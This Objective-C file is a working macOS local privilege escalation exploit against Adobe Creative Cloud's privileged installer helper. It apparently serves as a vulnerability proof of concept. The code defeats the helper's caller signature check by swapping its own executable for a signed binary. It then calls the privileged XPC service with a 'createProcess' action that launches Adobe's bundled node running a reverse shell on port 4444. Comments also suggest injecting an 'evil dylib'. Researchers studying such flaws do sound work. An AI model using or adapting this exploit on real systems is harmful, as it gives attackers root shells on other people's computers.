#import <Foundation/Foundation.h>
#import <xpc/xpc.h>

#define DUMMY @"/Library/PrivilegedHelperTools/com.adobe.acc.installer"

@protocol SMJobBlessHelperProtocol
- (void)handleAction:(id)arg1 withReply:(void (^)(NSString *))reply;
- (void)getHelperToolVersion:(void (^)(NSString *))reply;
@end

int main(int argc, const char *argv[]) {
  @autoreleasepool {
    // TOCTOU signature bypass
    NSString *executable = [[NSBundle mainBundle] executablePath];
    NSFileManager *mgr = [NSFileManager defaultManager];
    NSError *err = nil;
    [mgr removeItemAtPath:executable error:&err];
    if (err) {
      NSLog(@"failed to remove file: %@", err);
      return -1;
    }
    [mgr copyItemAtPath:DUMMY toPath:executable error:&err];
    if (err) {
      NSLog(@"failed to override self: %@", err);
      return -1;
    }

    // another easy way is to run a signed node.js, and use process.dlopen to
    // inject evil dylib
    NSLog(@"ready");
    dispatch_semaphore_t wait_for = dispatch_semaphore_create(0);
    // the local privilege escalation
    NSString *kXPCServiceName = @"com.adobe.acc.installer";
    NSXPCConnection *conn =
        [[NSXPCConnection alloc] initWithMachServiceName:kXPCServiceName options:NSXPCConnectionPrivileged];
    conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(SMJobBlessHelperProtocol)];
    conn.invalidationHandler = ^{
      NSLog(@"unknown error");
      dispatch_semaphore_signal(wait_for);
      exit(-1);
    };
    [conn resume];
    // yet another signature bypass: use node.js
    NSString *xml = @"<?xml version=\"1.0\" encoding=\"UTF-8\"?><action>"
                     "<actionType>createProcess</actionType>"
                     "<actionArgs><cmdArgs><cmdArg>-e</cmdArg>"
                     "<cmdArg>c=new "
                     "require('net').Socket();c.connect(4444,'127.0.0.1',()=>{s = "
                     "require('child_process').spawn('/bin/"
                     "sh',[]);c.write('!');c.pipe(s.stdin);s.stdout.pipe(c)})</cmdArg>"
                     "</cmdArgs>"
                     "<processPath>/Applications/Utilities/Adobe Creative "
                     "Cloud/CCLibrary/CCLibrary.app/Contents/libs/node</processPath>"
                     "</actionArgs>"
                     "</action>";
    id remote = [conn remoteObjectProxyWithErrorHandler:^(NSError *proxyError) {
      NSLog(@"error: %@", proxyError);
    }];
    [remote handleAction:xml
               withReply:^(NSString *reply) {
                 NSLog(@"reply: %@", reply);
                 dispatch_semaphore_signal(wait_for);
               }];
    dispatch_semaphore_wait(wait_for, dispatch_time(DISPATCH_TIME_NOW, 2ull * NSEC_PER_SEC));
    [mgr removeItemAtPath:executable error:&err];
  }
  return 0;
}